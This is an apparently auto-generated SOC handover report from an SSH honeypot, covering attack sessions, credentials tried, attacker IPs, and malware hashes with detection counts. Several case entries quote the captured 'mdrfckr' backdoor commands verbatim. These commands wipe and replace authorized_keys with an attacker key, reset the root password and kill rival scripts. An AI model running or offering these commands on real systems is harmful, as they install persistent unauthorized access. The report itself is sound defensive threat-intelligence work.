# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-07 |
| **Generated At** | 2026-04-07T15:06:50Z |
| **Shift Time** | 15:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **162** |
| Confirmed Threats | **35** |
| False Positives Filtered | **127** (78.4%) |
| Unique Attacker IPs | **12** |
| Countries of Origin | **6** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **157** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **11** |
| Unique Credential Pairs | **10** |
| Unique Usernames | **7** |
| Unique Passwords | **10** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `admin` | 1 |
| `alexis` | 1 |
| `ubuntu` | 1 |
| `ftpuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `ubuntu` | 2 |
| `admin` | 1 |
| `alexis` | 1 |
| `222222` | 1 |
| `Qwe2024` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `ubuntu` | 2 |
| `admin` | `admin` | 1 |
| `alexis` | `alexis` | 1 |
| `root` | `222222` | 1 |
| `root` | `Qwe2024` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ubuntu` | `43.248.184.188` | 2026-04-07T14:02:50 |
| `root` | `ubuntu` | `125.91.106.241` | 2026-04-07T14:39:32 |
| `root` | `222222` | `14.103.127.82` | 2026-04-07T14:48:43 |
| `root` | `Qwe2024` | `14.103.127.82` | 2026-04-07T14:50:19 |
| `root` | `qazwsx11111111!@` | `14.103.127.82` | 2026-04-07T14:50:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **162** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 29 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 27 | 2 |
| `98ddc5604ef6...` | Modern SSH client | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 27 | 2 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 2 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:5gQCKxPgBXhN"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.127.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **12** |
| Unique ASNs | **11** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS264439` | OuriNet TELECOM | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | HIGH |
| `AS56046` | China Mobile communications corporation | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7fe1c011d8a3

| Field | Detail |
|---|---|
| **Source IP** | `43.248.184[.]188` |
| **First Seen** | 2026-04-07 14:02 |
| **Last Seen** | 2026-04-07 14:03 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 14:02:50` | `cowrie.session.connect` |
| `2026-04-07 14:02:50` | `cowrie.client.version` |
| `2026-04-07 14:02:50` | `cowrie.client.kex` |
| `2026-04-07 14:02:50` | `cowrie.login.success` |
| `2026-04-07 14:03:35` | `cowrie.session.file_upload` |
| `2026-04-07 14:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.248.184[.]188` to AbuseIPDB if not already reported
- [ ] Block `43.248.184[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2b8cf781b5

| Field | Detail |
|---|---|
| **Source IP** | `125.91.106[.]241` |
| **First Seen** | 2026-04-07 14:39 |
| **Last Seen** | 2026-04-07 14:43 |
| **Session Duration** | 237s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 14:39:30` | `cowrie.session.connect` |
| `2026-04-07 14:39:30` | `cowrie.client.version` |
| `2026-04-07 14:39:30` | `cowrie.client.kex` |
| `2026-04-07 14:39:32` | `cowrie.login.success` |
| `2026-04-07 14:43:26` | `cowrie.session.file_upload` |
| `2026-04-07 14:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.91.106[.]241` to AbuseIPDB if not already reported
- [ ] Block `125.91.106[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287d6badca13

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]82` |
| **First Seen** | 2026-04-07 14:48 |
| **Last Seen** | 2026-04-07 14:49 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:5gQCKxPgBXhN"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 14:48:42` | `cowrie.session.connect` |
| `2026-04-07 14:48:42` | `cowrie.client.version` |
| `2026-04-07 14:48:42` | `cowrie.client.kex` |
| `2026-04-07 14:48:43` | `cowrie.login.success` |
| `2026-04-07 14:48:43` | `cowrie.session.params` |
| `2026-04-07 14:48:43` | `cowrie.command.input` |
| `2026-04-07 14:48:43` | `cowrie.command.failed` |
| `2026-04-07 14:48:43` | `cowrie.log.closed` |
| `2026-04-07 14:48:43` | `cowrie.session.params` |
| `2026-04-07 14:48:43` | `cowrie.command.input` |
| `2026-04-07 14:48:44` | `cowrie.session.file_download` |
| `2026-04-07 14:48:44` | `cowrie.log.closed` |
| `2026-04-07 14:48:56` | `cowrie.session.params` |
| `2026-04-07 14:48:56` | `cowrie.command.input` |
| `2026-04-07 14:48:56` | `cowrie.log.closed` |
| `2026-04-07 14:48:56` | `cowrie.session.params` |
| `2026-04-07 14:48:56` | `cowrie.command.input` |
| `2026-04-07 14:48:56` | `cowrie.log.closed` |
| `2026-04-07 14:48:57` | `cowrie.session.params` |
| `2026-04-07 14:48:57` | `cowrie.command.input` |
| `2026-04-07 14:48:57` | `cowrie.session.file_download` |
| `2026-04-07 14:48:57` | `cowrie.log.closed` |
| `2026-04-07 14:48:57` | `cowrie.session.params` |
| `2026-04-07 14:48:57` | `cowrie.command.input` |
| `2026-04-07 14:48:57` | `cowrie.log.closed` |
| `2026-04-07 14:48:58` | `cowrie.session.params` |
| `2026-04-07 14:48:58` | `cowrie.command.input` |
| `2026-04-07 14:48:58` | `cowrie.log.closed` |
| `2026-04-07 14:48:58` | `cowrie.session.params` |
| `2026-04-07 14:48:58` | `cowrie.command.input` |
| `2026-04-07 14:48:58` | `cowrie.command.input` |
| `2026-04-07 14:48:58` | `cowrie.log.closed` |
| `2026-04-07 14:48:58` | `cowrie.session.params` |
| `2026-04-07 14:48:58` | `cowrie.command.input` |
| `2026-04-07 14:48:59` | `cowrie.log.closed` |
| `2026-04-07 14:48:59` | `cowrie.session.params` |
| `2026-04-07 14:48:59` | `cowrie.command.input` |
| `2026-04-07 14:48:59` | `cowrie.log.closed` |
| `2026-04-07 14:48:59` | `cowrie.session.params` |
| `2026-04-07 14:48:59` | `cowrie.command.input` |
| `2026-04-07 14:49:00` | `cowrie.log.closed` |
| `2026-04-07 14:49:00` | `cowrie.session.params` |
| `2026-04-07 14:49:00` | `cowrie.command.input` |
| `2026-04-07 14:49:00` | `cowrie.log.closed` |
| `2026-04-07 14:49:00` | `cowrie.session.params` |
| `2026-04-07 14:49:00` | `cowrie.command.input` |
| `2026-04-07 14:49:00` | `cowrie.log.closed` |
| `2026-04-07 14:49:01` | `cowrie.session.params` |
| `2026-04-07 14:49:01` | `cowrie.command.input` |
| `2026-04-07 14:49:01` | `cowrie.log.closed` |
| `2026-04-07 14:49:01` | `cowrie.session.params` |
| `2026-04-07 14:49:01` | `cowrie.command.input` |
| `2026-04-07 14:49:01` | `cowrie.log.closed` |
| `2026-04-07 14:49:02` | `cowrie.session.params` |
| `2026-04-07 14:49:02` | `cowrie.command.input` |
| `2026-04-07 14:49:02` | `cowrie.log.closed` |
| `2026-04-07 14:49:02` | `cowrie.session.params` |
| `2026-04-07 14:49:02` | `cowrie.command.input` |
| `2026-04-07 14:49:02` | `cowrie.log.closed` |
| `2026-04-07 14:49:03` | `cowrie.session.params` |
| `2026-04-07 14:49:03` | `cowrie.command.input` |
| `2026-04-07 14:49:03` | `cowrie.log.closed` |
| `2026-04-07 14:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]82` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0072eefb20

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]82` |
| **First Seen** | 2026-04-07 14:50 |
| **Last Seen** | 2026-04-07 14:50 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2JM13Oil87kR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 14:50:18` | `cowrie.session.connect` |
| `2026-04-07 14:50:18` | `cowrie.client.version` |
| `2026-04-07 14:50:18` | `cowrie.client.kex` |
| `2026-04-07 14:50:19` | `cowrie.login.success` |
| `2026-04-07 14:50:19` | `cowrie.session.params` |
| `2026-04-07 14:50:19` | `cowrie.command.input` |
| `2026-04-07 14:50:19` | `cowrie.command.failed` |
| `2026-04-07 14:50:19` | `cowrie.log.closed` |
| `2026-04-07 14:50:20` | `cowrie.session.params` |
| `2026-04-07 14:50:20` | `cowrie.command.input` |
| `2026-04-07 14:50:20` | `cowrie.session.file_download` |
| `2026-04-07 14:50:20` | `cowrie.log.closed` |
| `2026-04-07 14:50:33` | `cowrie.session.params` |
| `2026-04-07 14:50:33` | `cowrie.command.input` |
| `2026-04-07 14:50:33` | `cowrie.log.closed` |
| `2026-04-07 14:50:33` | `cowrie.session.params` |
| `2026-04-07 14:50:33` | `cowrie.command.input` |
| `2026-04-07 14:50:33` | `cowrie.log.closed` |
| `2026-04-07 14:50:34` | `cowrie.session.params` |
| `2026-04-07 14:50:34` | `cowrie.command.input` |
| `2026-04-07 14:50:34` | `cowrie.session.file_download` |
| `2026-04-07 14:50:34` | `cowrie.log.closed` |
| `2026-04-07 14:50:34` | `cowrie.session.params` |
| `2026-04-07 14:50:34` | `cowrie.command.input` |
| `2026-04-07 14:50:34` | `cowrie.log.closed` |
| `2026-04-07 14:50:35` | `cowrie.session.params` |
| `2026-04-07 14:50:35` | `cowrie.command.input` |
| `2026-04-07 14:50:35` | `cowrie.log.closed` |
| `2026-04-07 14:50:35` | `cowrie.session.params` |
| `2026-04-07 14:50:35` | `cowrie.command.input` |
| `2026-04-07 14:50:35` | `cowrie.command.input` |
| `2026-04-07 14:50:35` | `cowrie.log.closed` |
| `2026-04-07 14:50:36` | `cowrie.session.params` |
| `2026-04-07 14:50:36` | `cowrie.command.input` |
| `2026-04-07 14:50:36` | `cowrie.log.closed` |
| `2026-04-07 14:50:36` | `cowrie.session.params` |
| `2026-04-07 14:50:36` | `cowrie.command.input` |
| `2026-04-07 14:50:36` | `cowrie.log.closed` |
| `2026-04-07 14:50:36` | `cowrie.session.params` |
| `2026-04-07 14:50:36` | `cowrie.command.input` |
| `2026-04-07 14:50:36` | `cowrie.log.closed` |
| `2026-04-07 14:50:37` | `cowrie.session.params` |
| `2026-04-07 14:50:37` | `cowrie.command.input` |
| `2026-04-07 14:50:37` | `cowrie.log.closed` |
| `2026-04-07 14:50:37` | `cowrie.session.params` |
| `2026-04-07 14:50:37` | `cowrie.command.input` |
| `2026-04-07 14:50:37` | `cowrie.log.closed` |
| `2026-04-07 14:50:38` | `cowrie.session.params` |
| `2026-04-07 14:50:38` | `cowrie.command.input` |
| `2026-04-07 14:50:38` | `cowrie.log.closed` |
| `2026-04-07 14:50:38` | `cowrie.session.params` |
| `2026-04-07 14:50:38` | `cowrie.command.input` |
| `2026-04-07 14:50:38` | `cowrie.log.closed` |
| `2026-04-07 14:50:39` | `cowrie.session.params` |
| `2026-04-07 14:50:39` | `cowrie.command.input` |
| `2026-04-07 14:50:39` | `cowrie.log.closed` |
| `2026-04-07 14:50:39` | `cowrie.session.params` |
| `2026-04-07 14:50:39` | `cowrie.command.input` |
| `2026-04-07 14:50:39` | `cowrie.log.closed` |
| `2026-04-07 14:50:39` | `cowrie.session.params` |
| `2026-04-07 14:50:39` | `cowrie.command.input` |
| `2026-04-07 14:50:40` | `cowrie.log.closed` |
| `2026-04-07 14:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]82` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6301e077495f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]82` |
| **First Seen** | 2026-04-07 14:50 |
| **Last Seen** | 2026-04-07 14:51 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:32kE0Vnd3wza"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 14:50:53` | `cowrie.session.connect` |
| `2026-04-07 14:50:53` | `cowrie.client.version` |
| `2026-04-07 14:50:53` | `cowrie.client.kex` |
| `2026-04-07 14:50:54` | `cowrie.login.success` |
| `2026-04-07 14:50:54` | `cowrie.session.params` |
| `2026-04-07 14:50:54` | `cowrie.command.input` |
| `2026-04-07 14:50:54` | `cowrie.command.failed` |
| `2026-04-07 14:50:54` | `cowrie.log.closed` |
| `2026-04-07 14:50:55` | `cowrie.session.params` |
| `2026-04-07 14:50:55` | `cowrie.command.input` |
| `2026-04-07 14:50:55` | `cowrie.session.file_download` |
| `2026-04-07 14:50:55` | `cowrie.log.closed` |
| `2026-04-07 14:51:07` | `cowrie.session.params` |
| `2026-04-07 14:51:07` | `cowrie.command.input` |
| `2026-04-07 14:51:07` | `cowrie.log.closed` |
| `2026-04-07 14:51:08` | `cowrie.session.params` |
| `2026-04-07 14:51:08` | `cowrie.command.input` |
| `2026-04-07 14:51:08` | `cowrie.log.closed` |
| `2026-04-07 14:51:08` | `cowrie.session.params` |
| `2026-04-07 14:51:08` | `cowrie.command.input` |
| `2026-04-07 14:51:08` | `cowrie.session.file_download` |
| `2026-04-07 14:51:08` | `cowrie.log.closed` |
| `2026-04-07 14:51:09` | `cowrie.session.params` |
| `2026-04-07 14:51:09` | `cowrie.command.input` |
| `2026-04-07 14:51:09` | `cowrie.log.closed` |
| `2026-04-07 14:51:09` | `cowrie.session.params` |
| `2026-04-07 14:51:09` | `cowrie.command.input` |
| `2026-04-07 14:51:09` | `cowrie.log.closed` |
| `2026-04-07 14:51:09` | `cowrie.session.params` |
| `2026-04-07 14:51:09` | `cowrie.command.input` |
| `2026-04-07 14:51:09` | `cowrie.command.input` |
| `2026-04-07 14:51:10` | `cowrie.log.closed` |
| `2026-04-07 14:51:10` | `cowrie.session.params` |
| `2026-04-07 14:51:10` | `cowrie.command.input` |
| `2026-04-07 14:51:10` | `cowrie.log.closed` |
| `2026-04-07 14:51:10` | `cowrie.session.params` |
| `2026-04-07 14:51:10` | `cowrie.command.input` |
| `2026-04-07 14:51:11` | `cowrie.log.closed` |
| `2026-04-07 14:51:11` | `cowrie.session.params` |
| `2026-04-07 14:51:11` | `cowrie.command.input` |
| `2026-04-07 14:51:11` | `cowrie.log.closed` |
| `2026-04-07 14:51:11` | `cowrie.session.params` |
| `2026-04-07 14:51:11` | `cowrie.command.input` |
| `2026-04-07 14:51:11` | `cowrie.log.closed` |
| `2026-04-07 14:51:12` | `cowrie.session.params` |
| `2026-04-07 14:51:12` | `cowrie.command.input` |
| `2026-04-07 14:51:12` | `cowrie.log.closed` |
| `2026-04-07 14:51:12` | `cowrie.session.params` |
| `2026-04-07 14:51:12` | `cowrie.command.input` |
| `2026-04-07 14:51:12` | `cowrie.log.closed` |
| `2026-04-07 14:51:13` | `cowrie.session.params` |
| `2026-04-07 14:51:13` | `cowrie.command.input` |
| `2026-04-07 14:51:13` | `cowrie.log.closed` |
| `2026-04-07 14:51:13` | `cowrie.session.params` |
| `2026-04-07 14:51:13` | `cowrie.command.input` |
| `2026-04-07 14:51:13` | `cowrie.log.closed` |
| `2026-04-07 14:51:14` | `cowrie.session.params` |
| `2026-04-07 14:51:14` | `cowrie.command.input` |
| `2026-04-07 14:51:14` | `cowrie.log.closed` |
| `2026-04-07 14:51:14` | `cowrie.session.params` |
| `2026-04-07 14:51:14` | `cowrie.command.input` |
| `2026-04-07 14:51:14` | `cowrie.log.closed` |
| `2026-04-07 14:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]82` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.127[.]82` | **24** | 2026-04-07 14:47 | 2026-04-07 14:59 | 36m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.4.79[.]138` | 1 | 2026-04-07 14:46 | 2026-04-07 14:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.221.236[.]23` | 1 | 2026-04-07 13:32 | 2026-04-07 13:32 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-04-07 14:43 | 2026-04-07 14:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]204` | 1 | 2026-04-07 13:22 | 2026-04-07 13:22 | 32s | 1 | `T1110.001` | 🟢 LOW |
| `218.161.99[.]102` | 1 | 2026-04-07 13:48 | 2026-04-07 13:48 | 30s | 0 | `T1592` | 🟢 LOW |
| `8.219.164[.]76` | 1 | 2026-04-07 13:14 | 2026-04-07 13:14 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
